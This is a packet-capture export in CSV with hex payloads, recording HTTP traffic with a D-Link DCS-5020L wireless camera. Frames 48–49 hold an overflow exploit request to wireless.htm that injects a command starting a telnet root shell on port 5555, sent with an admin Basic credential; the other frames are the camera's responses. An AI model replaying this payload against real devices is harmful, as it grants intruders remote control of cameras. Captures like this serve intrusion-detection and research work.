frame.number,frame.time,ip.src,ip.dst,tcp.seq,tcp.payload
"38","Mar  4, 2022 16:21:18.550998000 PST","192.168.0.134","192.168.0.243","1","485454502f312e302034303120417574686f72697a6174696f6e2052657175697265640d0a"
"39","Mar  4, 2022 16:21:18.551280000 PST","192.168.0.134","192.168.0.243","1","485454502f312e302034303120417574686f72697a6174696f6e2052657175697265640d0a"
"40","Mar  4, 2022 16:21:18.551721000 PST","192.168.0.134","192.168.0.243","38","5365727665723a20616c70686170640d0a446174653a20467269204d61722020342031363a32313a313820323032320d0a507261676d613a206e6f2d63616368650d0a43616368652d436f6e74726f6c3a206e6f2d63616368650d0a436f6e74656e742d747970653a20746578742f68746d6c0d0a"
"41","Mar  4, 2022 16:21:18.552003000 PST","192.168.0.134","192.168.0.243","38","5365727665723a20616c70686170640d0a446174653a20467269204d61722020342031363a32313a313820323032320d0a507261676d613a206e6f2d63616368650d0a43616368652d436f6e74726f6c3a206e6f2d63616368650d0a436f6e74656e742d747970653a20746578742f68746d6c0d0a"
"42","Mar  4, 2022 16:21:18.552676000 PST","192.168.0.134","192.168.0.243","155","436f6e74656e742d6c656e6774683a203130330d0a"
"43","Mar  4, 2022 16:21:18.552677000 PST","192.168.0.134","192.168.0.243","155","436f6e74656e742d6c656e6774683a203130330d0a"
"44","Mar  4, 2022 16:21:18.553399000 PST","192.168.0.134","192.168.0.243","176","5757572d41757468656e7469636174653a204261736963207265616c6d3d224443532d353032304c5f4241220d0a"
"45","Mar  4, 2022 16:21:18.553640000 PST","192.168.0.134","192.168.0.243","176","5757572d41757468656e7469636174653a204261736963207265616c6d3d224443532d353032304c5f4241220d0a"
"46","Mar  4, 2022 16:21:18.553640000 PST","192.168.0.134","192.168.0.243","222","0d0a3c68746d6c3e3c626f64793e3c68323e4572726f723a20417574686f72697a6174696f6e2052657175697265643c2f68323e0d0a3c703e41757468656e7469636174696f6e20776173207265717565737465643c2f703e3c2f626f64793e3c2f68746d6c3e0d0a0d0a"
"47","Mar  4, 2022 16:21:18.553928000 PST","192.168.0.134","192.168.0.243","222","0d0a3c68746d6c3e3c626f64793e3c68323e4572726f723a20417574686f72697a6174696f6e2052657175697265643c2f68323e0d0a3c703e41757468656e7469636174696f6e20776173207265717565737465643c2f703e3c2f626f64793e3c2f68746d6c3e0d0a0d0a"
"48","Mar  4, 2022 16:21:18.557354000 PST","192.168.0.243","192.168.0.134","1","474554202f776972656c6573732e68746d3f574550456e6372797074696f6e3d414141414141414141414141414141414025374625623025324125383040256233253241414141414141414141414141414141412566382561302562332532414141414142424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424274656c6e657464242537424946532537442d702425374249465325374435353535242537424946532537442d6c242537424946532537442f62696e2f736820485454502f312e310d0a486f73743a203139322e3136382e302e3133340d0a557365722d4167656e743a20707974686f6e2d72657175657374732f322e31382e340d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a4163636570743a202a2f2a0d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a526566657265723a20687474703a2f2f3139322e3136382e302e3133342f77697a6172642e68746d0d0a417574686f72697a6174696f6e3a2042617369632059575274615734364e5449784d6a4d314d6a45794d773d3d0d0a0d0a"
"49","Mar  4, 2022 16:21:18.557364000 PST","192.168.0.243","192.168.0.134","1","474554202f776972656c6573732e68746d3f574550456e6372797074696f6e3d414141414141414141414141414141414025374625623025324125383040256233253241414141414141414141414141414141412566382561302562332532414141414142424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424274656c6e657464242537424946532537442d702425374249465325374435353535242537424946532537442d6c242537424946532537442f62696e2f736820485454502f312e310d0a486f73743a203139322e3136382e302e3133340d0a557365722d4167656e743a20707974686f6e2d72657175657374732f322e31382e340d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a4163636570743a202a2f2a0d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a526566657265723a20687474703a2f2f3139322e3136382e302e3133342f77697a6172642e68746d0d0a417574686f72697a6174696f6e3a2042617369632059575274615734364e5449784d6a4d314d6a45794d773d3d0d0a0d0a"
"50","Mar  4, 2022 16:21:18.670006000 PST","192.168.0.134","192.168.0.243","1","485454502f312e3020323030204f4b0d0a"
"51","Mar  4, 2022 16:21:18.670006000 PST","192.168.0.134","192.168.0.243","1","485454502f312e3020323030204f4b0d0a"
"52","Mar  4, 2022 16:21:18.670735000 PST","192.168.0.134","192.168.0.243","18","5365727665723a20616c70686170640d0a446174653a20467269204d61722020342031363a31373a323120323032320d0a507261676d613a206e6f2d63616368650d0a43616368652d436f6e74726f6c3a206e6f2d63616368650d0a436f6e74656e742d747970653a20746578742f68746d6c0d0a0d0a"
"53","Mar  4, 2022 16:21:18.671015000 PST","192.168.0.134","192.168.0.243","18","5365727665723a20616c70686170640d0a446174653a20467269204d61722020342031363a31373a323120323032320d0a507261676d613a206e6f2d63616368650d0a43616368652d436f6e74726f6c3a206e6f2d63616368650d0a436f6e74656e742d747970653a20746578742f68746d6c0d0a0d0a"
"54","Mar  4, 2022 16:21:18.673712000 PST","192.168.0.134","192.168.0.243","137","3c68746d6c3e0d0a3c686561643e0d0a3c6c696e6b2072656c3d227374796c65736865657422207265763d227374796c6573686565742220687265663d22646c696e6b2e6373733f636964783d"
"55","Mar  4, 2022 16:21:18.673941000 PST","192.168.0.134","192.168.0.243","137","3c68746d6c3e0d0a3c686561643e0d0a3c6c696e6b2072656c3d227374796c65736865657422207265763d227374796c6573686565742220687265663d22646c696e6b2e6373733f636964783d"
"56","Mar  4, 2022 16:21:18.674481000 PST","192.168.0.134","192.168.0.243","214","312e3133"
"57","Mar  4, 2022 16:21:18.674481000 PST","192.168.0.134","192.168.0.243","214","312e3133"
"58","Mar  4, 2022 16:21:18.675198000 PST","192.168.0.134","192.168.0.243","218","323031352d31312d31382220747970653d22746578742f637373223e0d0a3c7469746c653e442d4c696e6b20436f72706f726174696f6e2e207c20574952454c45535320494e5445524e45542043414d455241207c205345545550207c20574952454c4553532053455455503c2f7469746c653e0d0a3c6d65746120687474702d65717569763d22582d55412d436f6d70617469626c652220636f6e74656e743d227265717569726573416374697665583d74727565223e0d0a3c6d65746120636f6e74656e743d22746578742f68746d6c3b20636861727365743d77696e646f77732d313235322220687474702d65717569763d436f6e74656e742d547970653e0d0a3c6d65746120485454502d45515549563d22507261676d612220434f4e54454e543d226e6f2d6361636865223e0d0a3c6d65746120485454502d45515549563d22457870697265732220434f4e54454e543d222d31223e0d0a3c736372697074206c616e67756167653d224a61766173637269707422205352433d2266756e6374696f6e2e6a733f636964783d"
"59","Mar  4, 2022 16:21:18.675547000 PST","192.168.0.134","192.168.0.243","218","323031352d31312d31382220747970653d22746578742f637373223e0d0a3c7469746c653e442d4c696e6b20436f72706f726174696f6e2e207c20574952454c45535320494e5445524e45542043414d455241207c205345545550207c20574952454c4553532053455455503c2f7469746c653e0d0a3c6d65746120687474702d65717569763d22582d55412d436f6d70617469626c652220636f6e74656e743d227265717569726573416374697665583d74727565223e0d0a3c6d65746120636f6e74656e743d22746578742f68746d6c3b20636861727365743d77696e646f77732d313235322220687474702d65717569763d436f6e74656e742d547970653e0d0a3c6d65746120485454502d45515549563d22507261676d612220434f4e54454e543d226e6f2d6361636865223e0d0a3c6d65746120485454502d45515549563d22457870697265732220434f4e54454e543d222d31223e0d0a3c736372697074206c616e67756167653d224a61766173637269707422205352433d2266756e6374696f6e2e6a733f636964783d"
"60","Mar  4, 2022 16:21:18.675877000 PST","192.168.0.134","192.168.0.243","619","312e3133"
"61","Mar  4, 2022 16:21:18.675877000 PST","192.168.0.134","192.168.0.243","619","312e3133"
"62","Mar  4, 2022 16:21:18.676767000 PST","192.168.0.134","192.168.0.243","623","323031352d31312d3138"
"63","Mar  4, 2022 16:21:18.676767000 PST","192.168.0.134","192.168.0.243","623","323031352d31312d3138"
"64","Mar  4, 2022 16:21:18.682021000 PST","192.168.0.134","192.168.0.243","633","223e3c2f7363726970743e0d0a3c736372697074206c616e67756167653d224a617661736372697074223e0d0a2f2f69662028746f7020213d2073656c6629207b0d0a2f2f20202020746f702e6c6f636174696f6e203d2073656c662e6c6f636174696f6e3b0d0a2f2f7d0d0a3c2f7363726970743e0d0a3c736372697074206c616e67756167653d224a617661736372697074223e0d0a66756e6374696f6e204f6e5369746553757276657928290d0a7b0d0a20206e657777696e646f773d77696e646f772e6f70656e282273657453797374656d415052655363616e3f5265706c7953756363657373506167653d776169747363616e2e68746d265265706c794572726f72506167653d776169747363616e2e68746d222c22222c22746f6f6c6261723d302c6c6f636174696f6e3d302c6469726563746f726965733d302c7374617475733d302c6d656e756261723d302c77696474683d3830302c6865696768743d3430302c7363726f6c6c626172733d3122293b0d0a7d0d0a66756e6374696f6e20636c69636b43686b424f5828290d0a7b0d0a202066726d203d20646f63756d656e742e666f726d735b305d3b0d0a20206966202866726d2e546d70576972656c65737344697361626c652e636865636b6564290d0a202020202066726d2e576972656c65737344697361626c652e76616c7565203d20303b0d0a2020656c73650d0a202020202066726d2e576972656c65737344697361626c652e76616c7565203d20313b0d0a2020636c69636b4155544f28293b0d0a7d0d0a66756e6374696f6e20636c69636b4155544f28290d0a7b0d0a202066726d203d20646f63756d656e742e666f726d735b305d3b0d0a20206966202866726d2e576972656c65737344697361626c652e76616c7565203d3d2030290d0a202020202066726d2e546d70576972656c65737344697361626c652e636865636b6564203d20747275653b0d0a2020656c73650d0a202020202066726d2e546d70576972656c65737344697361626c652e636865636b6564203d2066616c73653b0d0a20206966202866726d2e576972656c65737344697361626c652e76616c7565203d3d2030290d0a20207b0d0a2020202066726d2e535349442e64697361626c6564203d2066616c73653b0d0a2020202066726d2e436f6e6e656374696f6e4d6f64655f496e6672612e64697361626c6564203d2066616c73653b0d0a2020202066726d2e436f6e6e656374696f6e4d6f64655f4164486f632e64697361626c6564203d2066616c73653b0d0a2020202066726d2e536974655375727665792e64697361626c6564203d2066616c73653b0d0a20202020656e61626c655f626f782869645f7365637572697479293b0d0a202020206966202866726d2e436f6e6e656374696f6e4d6f64655b305d2e636865636b6564290d0a202020207b0d0a2020202020202066726d2e576972656c6573734368616e6e656c2e64697361626c6564203d20747275653b0d0a2020202020202066726d2e574550456e6372795761795b325d2e64697361626c6564203d2066616c73653b0d0a2020202020202066726d2e5072655368617265644b65792e64697361626c6564203d2066616c73653b0d0a202020207d0d0a20202020656c73652020200d0a202020207b0d0a2020202020202066726d2e576972656c6573734368616e6e656c2e64697361626c6564203d2066616c73653b0d0a2020202020202066726d2e574550456e6372795761795b325d2e64697361626c6564203d20747275653b0d0a2020202020202066726d2e5072655368617265644b65792e64697361626c6564203d20747275653b0d0a20202020202020696620282866726d2e574550456e6372797074696f6e2e76616c7565203d3d203229207c7c202866726d2e574550456e6372797074696f6e2e76616c7565203d3d203329290d0a2020202020202020202066726d2e574550456e6372795761795b315d2e636865636b6564203d20747275653b0d0a202020202020206966202866726d2e574550456e6372797074696f6e2e76616c7565203d3d2034290d0a2020202020202020202066726d2e574550456e6372795761795b325d2e636865636b6564203d20747275653b0d0a202020202020206966202866726d2e574550456e6372795761795b325d2e636865636b6564290d0a202020202020207b0d0a2020202020202020202066726d2e574550456e6372795761795b305d2e636865636b6564203d20747275653b0d0a2020202020202020202066726d2e574550456e6372797074696f6e2e76616c7565203d20303b0d0a202020202020207d0d0a202020207d0d0a202020202f2a66726d2e54785261746553656c2e76616c7565203d2066726d2e5472616e736d697373696f6e526174652e76616c75653b2a2f0d0a2020202066726d2e54784b657953656c2e76616c7565203d2066726d2e54784b65792e76616c75653b0d0a2020202066726d2e4b65794c656e53656c2e76616c7565203d2066726d2e5745504b65794c656e2e76616c75653b0d0a2020202066726d2e4b6579466f726d617453656c2e76616c7565203d2066726d2e5745504b6579466f726d61742e76616c75653b0d0a20202020436865636b4b657928293b0d0a20207d0d0a2020656c73652020200d0a20207b0d0a202020202066726d2e535349442e64697361626c6564203d20747275653b0d0a202020202066726d2e576972656c6573734368616e6e656c2e64697361626c6564203d20747275653b0d0a202020202066726d2e436f6e6e656374696f6e"
"65","Mar  4, 2022 16:21:18.682312000 PST","192.168.0.134","192.168.0.243","2680","4d6f64655f496e6672612e64697361626c6564203d20747275653b0d0a202020202066726d2e436f6e6e656374696f6e4d6f64655f4164486f632e64697361626c6564203d20747275653b0d0a202020202066726d2e536974655375727665792e64697361626c6564203d20747275653b0d0a202020202064697361626c655f626f782869645f7365637572697479293b0d0a202020202064697361626c655f626f782869645f776570293b0d0a202020202064697361626c655f626f782869645f777061293b0d0a20207d0d0a7d0d0a66756e6374696f6e20436865636b4b657928297b0d0a202066726d203d20646f63756d656e742e666f726d735b305d3b0d0a0d0a20202f2a66726d2e5472616e736d697373696f6e526174652e76616c7565203d2066726d2e54785261746553656c2e76616c75653b2a2f0d0a20206966202866726d2e574550456e6372795761795b305d2e636865636b6564290d0a20207b0d0a202020202068696465282269645f77657022293b0d0a202020202068696465282269645f77706122293b0d0a202020202064697361626c655f626f782869645f776570293b0d0a202020202064697361626c655f626f782869645f777061293b0d0a202020202066726d2e574550456e6372797074696f6e2e76616c7565203d20303b0d0a202020202066726d2e4b6579312e6d61784c656e677468203d20303b0d0a202020202066726d2e4b6579322e6d61784c656e677468203d20303b0d0a202020202066726d2e4b6579332e6d61784c656e677468203d20303b0d0a202020202066726d2e4b6579342e6d61784c656e677468203d20303b0d0a20207d0d0a0d0a20206966202866726d2e574550456e6372795761795b315d2e636865636b6564290d0a20207b0d0a202020202073686f77282269645f77657022293b0d0a202020202068696465282269645f77706122293b0d0a2020202020656e61626c655f626f782869645f776570293b0d0a202020202064697361626c655f626f782869645f777061293b0d0a20202020206966202866726d2e436f6e6e656374696f6e4d6f64655b305d2e636865636b6564290d0a20202020207b0d0a202020202020202073686f77282269645f6175746822293b0d0a2020202020202020656e61626c655f626f782869645f61757468293b0d0a20202020207d0d0a2020202020656c73650d0a20202020207b0d0a202020202020202068696465282269645f6175746822293b0d0a202020202020202064697361626c655f626f782869645f61757468293b0d0a20202020207d0d0a202020202066726d2e5745504b6579466f726d61742e76616c7565203d2066726d2e4b6579466f726d617453656c2e76616c75653b0d0a202020202066726d2e54784b65792e76616c7565203d2066726d2e54784b657953656c2e76616c75653b0d0a20202020206966202866726d2e4b65794c656e53656c2e76616c7565203d3d2030290d0a20202020207b0d0a202020202020202066726d2e574550456e6372797074696f6e2e76616c7565203d20323b0d0a20202020202020206966202866726d2e4b6579466f726d617453656c2e76616c7565203d3d2030290d0a20202020202020207b0d0a202020202020202020202066726d2e4b6579312e6d61784c656e677468203d20353b0d0a202020202020202020202066726d2e4b6579322e6d61784c656e677468203d20353b0d0a202020202020202020202066726d2e4b6579332e6d61784c656e677468203d20353b0d0a202020202020202020202066726d2e4b6579342e6d61784c656e677468203d20353b0d0a20202020202020207d0d0a2020202020202020656c73650d0a20202020202020207b0d0a202020202020202020202066726d2e4b6579312e6d61784c656e677468203d2031303b0d0a202020202020202020202066726d2e4b6579322e6d61784c656e677468203d2031303b0d0a2020202020202020"
"66","Mar  4, 2022 16:21:18.682698000 PST","192.168.0.134","192.168.0.243","633","223e3c2f7363726970743e0d0a3c736372697074206c616e67756167653d224a617661736372697074223e0d0a2f2f69662028746f7020213d2073656c6629207b0d0a2f2f20202020746f702e6c6f636174696f6e203d2073656c662e6c6f636174696f6e3b0d0a2f2f7d0d0a3c2f7363726970743e0d0a3c736372697074206c616e67756167653d224a617661736372697074223e0d0a66756e6374696f6e204f6e5369746553757276657928290d0a7b0d0a20206e657777696e646f773d77696e646f772e6f70656e282273657453797374656d415052655363616e3f5265706c7953756363657373506167653d776169747363616e2e68746d265265706c794572726f72506167653d776169747363616e2e68746d222c22222c22746f6f6c6261723d302c6c6f636174696f6e3d302c6469726563746f726965733d302c7374617475733d302c6d656e756261723d302c77696474683d3830302c6865696768743d3430302c7363726f6c6c626172733d3122293b0d0a7d0d0a66756e6374696f6e20636c69636b43686b424f5828290d0a7b0d0a202066726d203d20646f63756d656e742e666f726d735b305d3b0d0a20206966202866726d2e546d70576972656c65737344697361626c652e636865636b6564290d0a202020202066726d2e576972656c65737344697361626c652e76616c7565203d20303b0d0a2020656c73650d0a202020202066726d2e576972656c65737344697361626c652e76616c7565203d20313b0d0a2020636c69636b4155544f28293b0d0a7d0d0a66756e6374696f6e20636c69636b4155544f28290d0a7b0d0a202066726d203d20646f63756d656e742e666f726d735b305d3b0d0a20206966202866726d2e576972656c65737344697361626c652e76616c7565203d3d2030290d0a202020202066726d2e546d70576972656c65737344697361626c652e636865636b6564203d20747275653b0d0a2020656c73650d0a202020202066726d2e546d70576972656c65737344697361626c652e636865636b6564203d2066616c73653b0d0a20206966202866726d2e576972656c65737344697361626c652e76616c7565203d3d2030290d0a20207b0d0a2020202066726d2e535349442e64697361626c6564203d2066616c73653b0d0a2020202066726d2e436f6e6e656374696f6e4d6f64655f496e6672612e64697361626c6564203d2066616c73653b0d0a2020202066726d2e436f6e6e656374696f6e4d6f64655f4164486f632e64697361626c6564203d2066616c73653b0d0a2020202066726d2e536974655375727665792e64697361626c6564203d2066616c73653b0d0a20202020656e61626c655f626f782869645f7365637572697479293b0d0a202020206966202866726d2e436f6e6e656374696f6e4d6f64655b305d2e636865636b6564290d0a202020207b0d0a2020202020202066726d2e576972656c6573734368616e6e656c2e64697361626c6564203d20747275653b0d0a2020202020202066726d2e574550456e6372795761795b325d2e64697361626c6564203d2066616c73653b0d0a2020202020202066726d2e5072655368617265644b65792e64697361626c6564203d2066616c73653b0d0a202020207d0d0a20202020656c73652020200d0a202020207b0d0a2020202020202066726d2e576972656c6573734368616e6e656c2e64697361626c6564203d2066616c73653b0d0a2020202020202066726d2e574550456e6372795761795b325d2e64697361626c6564203d20747275653b0d0a2020202020202066726d2e5072655368617265644b65792e64697361626c6564203d20747275653b0d0a20202020202020696620282866726d2e574550456e6372797074696f6e2e76616c7565203d3d203229207c7c202866726d2e574550456e6372797074696f6e2e76616c7565203d3d203329290d0a2020202020202020202066726d2e574550456e6372795761795b315d2e636865636b6564203d20747275653b0d0a202020202020206966202866726d2e574550456e6372797074696f6e2e76616c7565203d3d2034290d0a2020202020202020202066726d2e574550456e6372795761795b325d2e636865636b6564203d20747275653b0d0a202020202020206966202866726d2e574550456e6372795761795b325d2e636865636b6564290d0a202020202020207b0d0a2020202020202020202066726d2e574550456e6372795761795b305d2e636865636b6564203d20747275653b0d0a2020202020202020202066726d2e574550456e6372797074696f6e2e76616c7565203d20303b0d0a202020202020207d0d0a202020207d0d0a202020202f2a66726d2e54785261746553656c2e76616c7565203d2066726d2e5472616e736d697373696f6e526174652e76616c75653b2a2f0d0a2020202066726d2e54784b657953656c2e76616c7565203d2066726d2e54784b65792e76616c75653b0d0a2020202066726d2e4b65794c656e53656c2e76616c7565203d2066726d2e5745504b65794c656e2e76616c75653b0d0a2020202066726d2e4b6579466f726d617453656c2e76616c7565203d2066726d2e5745504b6579466f726d61742e76616c75653b0d0a20202020436865636b4b657928293b0d0a20207d0d0a2020656c73652020200d0a20207b0d0a202020202066726d2e535349442e64697361626c6564203d20747275653b0d0a202020202066726d2e576972656c6573734368616e6e656c2e64697361626c6564203d20747275653b0d0a202020202066726d2e436f6e6e656374696f6e"
